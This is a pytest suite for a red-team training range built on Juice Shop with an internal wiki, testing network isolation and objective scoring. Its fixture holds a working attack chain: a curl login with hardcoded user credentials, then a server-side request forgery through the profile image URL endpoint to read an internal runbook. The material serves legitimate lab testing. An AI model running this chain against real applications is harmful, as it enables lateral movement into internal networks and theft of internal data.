"""There has to be somewhere to go once you are in.

An estate with one host in it has no inside. Everything after initial access -
internal reconnaissance, lateral movement - cannot happen, so a range built
that way exercises exactly one stage of an attack and calls itself a red team
range. The Korean red team playbook puts the case plainly: finding a few
vulnerabilities in a web app does not tell you whether an attacker used that
app as a proxy into the estate and took something from behind it.

So the estate has a second host, and it is reachable from the application and
from nowhere else. Getting to it is the attack the playbook describes, and the
wiki records the visit itself - the target judges its own defeat, the same way
the shop flips its own `solved` flag.
"""

import subprocess

import pytest
import requests

from conftest import PLATFORM_URL, REPO_ROOT

INSIDE = "http://wiki.internal/"
SECRET = "/runbooks/deploy.html"
OBJECTIVE = "internalRunbookRead"


def _in(container, *argv, timeout=60):
    return subprocess.run(
        ["docker", "exec", container, *argv],
        capture_output=True, text=True, timeout=timeout,
    )


def _status_from(container, url, node=False):
    if node:
        # The body has to be consumed or node never exits: an unread response
        # keeps the socket open and the process with it.
        script = (
            f"require('http').get('{url}', r => {{ console.log(r.statusCode);"
            f" r.resume(); r.on('end', () => process.exit(0)); }})"
            f".on('error', () => {{ console.log('000'); process.exit(0); }});"
        )
        return _in(container, "/nodejs/bin/node", "-e", script, timeout=30).stdout.strip()
    return _in(
        container, "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
        "--max-time", "8", "--noproxy", "*", url,
    ).stdout.strip()


def test_the_inside_is_not_reachable_from_the_internet(stack_is_up):
    # If it were, it would not be an inside - it would be a second front door,
    # and reaching it would prove nothing about lateral movement.
    assert _status_from("fsl-kali", INSIDE) == "000", (
        "the attacker's box can reach the internal wiki directly"
    )


def test_the_inside_is_reachable_from_the_application(stack_is_up):
    # This is what makes the app worth compromising: it is the way across.
    assert _status_from("fsl-juice-shop", INSIDE, node=True) == "200"


def test_the_wiki_keeps_its_own_record_of_what_was_read(stack_is_up):
    before = _in("fsl-wiki", "wc", "-l", "/var/log/nginx/read.log").stdout.split()[0]
    _status_from("fsl-juice-shop", f"http://wiki.internal{SECRET}", node=True)
    after = _in("fsl-wiki", "wc", "-l", "/var/log/nginx/read.log").stdout.split()[0]

    assert int(after) > int(before), (
        "the wiki did not record being read, so nothing can judge whether the "
        "inside was reached except our own opinion of the traffic"
    )


def test_the_inside_is_an_objective_the_target_judges(stack_is_up):
    offered = requests.get(
        f"{PLATFORM_URL}/api/wargames/juice-shop/objectives/", timeout=60
    ).json()
    internal = next((o for o in offered if o["key"] == OBJECTIVE), None)

    assert internal, f"{OBJECTIVE} is not on the board"
    assert internal["difficulty"] >= 1 and internal["category"]


@pytest.fixture(scope="module")
def taken_through_the_app(stack_is_up):
    """The whole chain, from outside: log in, then make the app fetch the inside.

    Two stages, and the second is the one the case buttons cannot do - a case
    is one request, and this needs the credential from the first.

    Only the wiki's record is cleared, not the shop. Resetting the target here
    would hand the next module a shop with different objectives outstanding,
    and it did: a neighbouring test fires one request expecting one objective,
    and got two once the bundled challenge behind it had been cleared. Shared
    state reset by whoever happens to run first is how a suite starts
    measuring the order it ran in.
    """
    (REPO_ROOT / "deploy/wiki/logs/read.log").write_text("")

    script = f'''
      T=$(curl -s --max-time 20 -H "Content-Type: application/json" \\
        -d '{{"email":"jim@juice-sh.op","password":"ncc-1701"}}' \\
        "$FSL_TARGET/rest/user/login" | jq -r .authentication.token)
      [ -n "$T" ] || exit 1
      curl -s -o /dev/null --max-time 25 -b "token=$T" -H "Authorization: Bearer $T" \\
        --data-urlencode "imageUrl=http://wiki.internal{SECRET}" \\
        "$FSL_TARGET/profile/image/url"
    '''
    run = _in("fsl-kali", "bash", "-c", script, timeout=180)
    assert run.returncode == 0, f"the chain did not run: {run.stderr[:300]}"

    import time
    time.sleep(4)
    return _in("fsl-wiki", "tail", "-5", "/var/log/nginx/read.log").stdout


def test_the_application_can_be_made_to_read_the_inside(taken_through_the_app):
    assert SECRET in taken_through_the_app, (
        "the attacker logged in and asked the app to fetch the internal wiki, "
        "and the wiki never saw it - the lateral movement path is gone"
    )


def test_the_visit_came_from_the_application_not_from_outside(taken_through_the_app):
    # The whole point: the request arrived from inside the estate, made by the
    # application, on behalf of somebody who cannot reach it at all.
    reads = [l for l in taken_through_the_app.splitlines() if SECRET in l]

    assert reads
    assert any("172.30." in line for line in reads), reads


def test_reaching_the_inside_is_scored(taken_through_the_app):
    taken = requests.get(
        f"{PLATFORM_URL}/api/wargames/juice-shop/objectives/", timeout=60
    ).json()
    internal = next(o for o in taken if o["key"] == OBJECTIVE)

    assert internal["solved"], "the inside was read and nothing counted it"
    assert internal["solved_at"], "no time for it, so it can be attributed to nobody"
